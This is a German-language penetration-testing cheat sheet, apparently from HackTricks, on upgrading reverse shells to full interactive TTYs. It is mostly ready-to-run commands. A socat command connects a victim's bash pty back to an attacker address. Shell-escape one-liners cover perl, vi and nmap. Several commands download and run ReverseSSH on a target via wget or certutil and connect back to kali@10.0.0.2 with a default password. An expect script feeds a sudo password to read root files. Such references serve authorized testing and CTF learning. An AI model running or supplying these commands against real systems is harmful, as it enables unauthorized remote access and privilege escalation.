# Vollständige TTYs

{{#include ../../banners/hacktricks-training.md}}

## Vollständige TTY

`/etc/shells` listet gültige Pfadnamen von Login-Shells auf und wird von einigen Programmen konsultiert; es ist keine universelle Voraussetzung für die Zuweisung eines PTY.<sup>[[3]](#references)[[4]](#references)</sup> Wenn ein Programm wie `pkexec` `SHELL` mit `The value for the SHELL variable was not found in the /etc/shells file` ablehnt, stelle sicher, dass der exakte Shell-Pfad (zum Beispiel `/bin/bash`) in `/etc/shells` enthalten ist.<sup>[[10]](#references)</sup> Die Wiederherstellungssequenz `CTRL+Z`/`fg` unten verwendet die Bash-Job-Control; wenn die aktuelle Shell nicht Bash ist, starte Bash, bevor du diese Sequenz verwendest.<sup>[[7]](#references)</sup>

#### Python

Pythons `pty.spawn` startet ein Programm, das mit den Standardeingabe-, Standardausgabe- und Standardfehlerstreams des aktuellen Prozesses verbunden ist, wodurch Bash in dieser Sitzung ein Pseudo-Terminal erhält.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Sie können die **Anzahl** der **Zeilen** und **Spalten** ermitteln, indem Sie **`stty -a`** ausführen; `-a` gibt alle aktuellen Terminaleinstellungen aus. Die Ausgabe des Befehls ist terminalspezifisch. Verwenden Sie daher die von der aktuellen Sitzung gemeldeten Werte.<sup>[[11]](#references)</sup>

#### script

Das Dienstprogramm `script` zeichnet eine Terminalsitzung auf; hier verwirft `/dev/null` das Typescript, `-q` unterdrückt Start- und Abschlussmeldungen, und `-c` führt Bash anstelle der Standard-Shell aus.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Nach einer der beiden PTY-spawn-Methoden pausieren Sie die Netcat-Sitzung und setzen sie mit lokalem Raw-Modus fort. Richten Sie anschließend die Remote-Terminal-Umgebung und -Abmessungen ein:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Der Listener verwendet das aktuelle Terminal im Raw-Modus mit deaktiviertem lokalem Echo und akzeptiert TCP-Verbindungen auf Port 4444. Der Befehl auf dem Opfer weist ein pty zu, verbindet stderr, erstellt eine Sitzung, leitet SIGINT weiter und wendet sinnvolle Terminaleinstellungen an; füge `ctty` hinzu, wenn der untergeordnete Prozess ein steuerndes Terminal benötigt.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shells starten**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (alte Versionen mit `--interactive`): `!sh`

Der Nmap-Escape ist versionsabhängig: Nmap hat den Modus `--interactive` in späteren Versionen entfernt, daher funktioniert `!sh` nur mit alten Versionen.<sup>[[13]](#references)</sup>

## ReverseSSH

Eine praktische Möglichkeit für **interaktiven Shell-Zugriff** sowie **Dateiübertragungen** und **Port-Weiterleitung** besteht darin, den statisch gelinkten SSH-Server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) auf das Zielsystem zu übertragen.<sup>[[1]](#references)</sup>

Nachfolgend ist ein Beispiel für `x86` mit der vom Projekt veröffentlichten, UPX-komprimierten Binary aufgeführt. Für andere Architekturen oder Release-Artefakte dient die [Releases-Seite](https://github.com/Fahrj/reverse-ssh/releases/latest/) als Orientierung.<sup>[[1]](#references)</sup>

1. Bereite den lokalen Host vor, um die eingehende SSH-Verbindung abzufangen. Im Listener-Modus aktiviert `-l` den Listener, und `-p 4444` legt den Port fest, an dem die Verbindung des Ziels akzeptiert wird.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target. Übertrage dasselbe Artefakt `upx_reverse-sshx86` nach `/dev/shm/reverse-ssh` und mache es ausführbar. Das `-p 4444` des Targets wählt den oben angegebenen Listener-Port aus, und `kali@10.0.0.2` liefert den Account und Host, die für die Rückverbindung verwendet werden.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows-Ziel. Für eine vollständig interaktive PowerShell ist Windows 10 Build 17763 erforderlich; siehe die [Projekt-README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Das Windows-Beispiel verwendet `certutil` mit `-f -urlcache`; Microsoft dokumentiert `-f` als Erzwingen des Abrufs einer URL und weist darauf hin, dass die verfügbaren Parameter je nach Version variieren. Prüfe daher `certutil -?`, falls diese Form nicht verfügbar ist.<sup>[[12]](#references)</sup>

- Nachdem die Reverse-Verbindung erfolgreich hergestellt wurde, bindet der Listener von ReverseSSH im reverse-mode standardmäßig Port `8888` (oder den mit `-b` angegebenen Wert), und eingehende Verbindungen akzeptieren jeden Benutzernamen mit dem Standardpasswort `letmeinbrudipls`. Die Remote-Shell wird mit den Berechtigungen des Kontos ausgeführt, das `reverse-ssh(.exe)` gestartet hat.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) aktualisiert Unix-ähnliche reverse shells automatisch auf PTY, passt die Größe von Unix-ähnlichen Terminals an und protokolliert Shell-Interaktionen; für Windows-Shells bietet es readline, jedoch keine Anpassung der Terminalgröße in Echtzeit.<sup>[[2]](#references)</sup>

Führe `penelope` aus, um standardmäßig auf `0.0.0.0:4444` zu lauschen; eingehende Unix-ähnliche Shells können anschließend automatisch aktualisiert und protokolliert werden.<sup>[[2]](#references)</sup>

![Penelope verarbeitet und aktualisiert eine eingehende Shell](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Wenn du aus irgendeinem Grund kein vollständiges TTY erhalten kannst, **kannst du dennoch mit Programmen interagieren**, die Benutzereingaben erwarten. Im folgenden Beispiel startet Expect `sudo`, wartet auf dessen Passwortabfrage, sendet das Passwort und gibt mit `interact` die Kontrolle zurück; `sudo -S` liest sein Passwort aus der Standardeingabe. Verwende dies nur in einem autorisierten Labor und vermeide es, echte Zugangsdaten im Shell-Verlauf oder in Quelldateien zu speichern.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Statisch gelinkter ssh-Server mit Reverse-Shell-Funktionalität für CTFs und Ähnliches](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell-Handler, der einige Dinge automatisiert, um das Leben zu erleichtern](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python-Dokumentation](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash-Referenzhandbuch — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap-Änderungsprotokoll](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
